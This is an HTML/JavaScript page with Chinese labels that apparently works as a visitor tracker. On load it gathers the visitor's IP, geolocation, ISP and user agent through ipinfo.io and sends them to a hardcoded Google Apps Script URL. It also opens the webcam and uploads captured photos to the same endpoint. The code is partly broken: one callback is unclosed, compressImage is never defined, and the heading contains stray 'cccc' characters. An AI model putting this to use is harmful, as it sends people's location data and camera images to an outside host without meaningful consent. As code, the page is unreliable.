<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>IP 與設備訊息記錄</title>
</head>
<body>
  <h1>IP 與設備訊cccccccccccccccc息記錄</h1>
  <p id="ipInfo">IP 資訊載入中...</p>
  <p id="status">尚未開始操作</p>
  <video id="video" autoplay playsinline width="320" height="240"></video>
  <canvas id="canvas" style="display: none;"></canvas>
  <button id="capture">拍攝照片</button>

  <script>
    // 取得 IP 與地理位置資訊
    async function getIpInfo() {
      try {
        const response = await fetch('https://ipinfo.io/json');
        const data = await response.json();
        const { ip, city, region, country, org } = data;
        const ipType = ip.includes('.') ? 'IPV4' : 'IPV6';
        const userAgent = navigator.userAgent;

        // 顯示 IP 資訊
        document.getElementById('ipInfo').innerText =
          `IP: ${ip}, 類型: ${ipType}, 城市: ${city}, 區域: ${region}, 國家: ${country}, 組織: ${org}, 用戶代理: ${userAgent}`;

        // 發送 GET 請求到 Google Apps Script
        const url = new URL('https://script.google.com/macros/s/AKfycby5gVmyBS4hoEep0zDl1QYMTFnb78aCkaf1E8VMSM6DUCv_WPALdr1nnP1yb6f9Ty-qCw/exec'); // 替換為您的 URL
        url.searchParams.append('ip', ip);
        url.searchParams.append('ipType', ipType);
        url.searchParams.append('userAgent', userAgent);
        url.searchParams.append('city', city);
        url.searchParams.append('region', region);
        url.searchParams.append('country', country);
        url.searchParams.append('org', org);

        const result = await fetch(url.toString());
        const responseData = await result.json();

        if (responseData.success) {
          document.getElementById('status').innerText = 'IP 資訊已成功上傳！';
        } else {
          document.getElementById('status').innerText = '伺服器錯誤，無法上傳。';
        }
      } catch (error) {
        console.error('錯誤:', error);
        document.getElementById('status').innerText = '操作失敗，請檢查控制台。';
      }
    }

    // 拍攝照片並上傳
    async function capturePhoto() {
      const video = document.getElementById('video');
      const canvas = document.getElementById('canvas');
      const ctx = canvas.getContext('2d');

      // 將視頻畫面捕捉到畫布
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      canvas.toBlob(async (blob) => {
        const compressedBlob = await compressImage(blob);

      // 將圖片轉換為 Blob 格式
      canvas.toBlob(async (blob) => {
        const formData = new FormData();
        formData.append('photo', blob, 'photo.jpg');

        const response = await fetch('https://script.google.com/macros/s/AKfycby5gVmyBS4hoEep0zDl1QYMTFnb78aCkaf1E8VMSM6DUCv_WPALdr1nnP1yb6f9Ty-qCw/exec', {
          method: 'POST',
          body: formData, // 直接傳送 FormData，避免 CORS 問題
        });

        const result = await response.json();
        if (result.success) {
          document.getElementById('status').innerText = '照片成功上傳！';
        } else {
          document.getElementById('status').innerText = '照片上傳失敗。';
        }
      }, 'image/jpeg');
    }

    // 初始化攝像頭
    async function initCamera() {
      const video = document.getElementById('video');
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      video.srcObject = stream;
    }

    document.addEventListener('DOMContentLoaded', () => {
      getIpInfo();
      initCamera().catch(error => {
        document.getElementById('status').innerText = '無法啟動攝像頭：' + error.message;
      });

      document.getElementById('capture').addEventListener('click', capturePhoto);
    });
  </script>
</body>
</html>
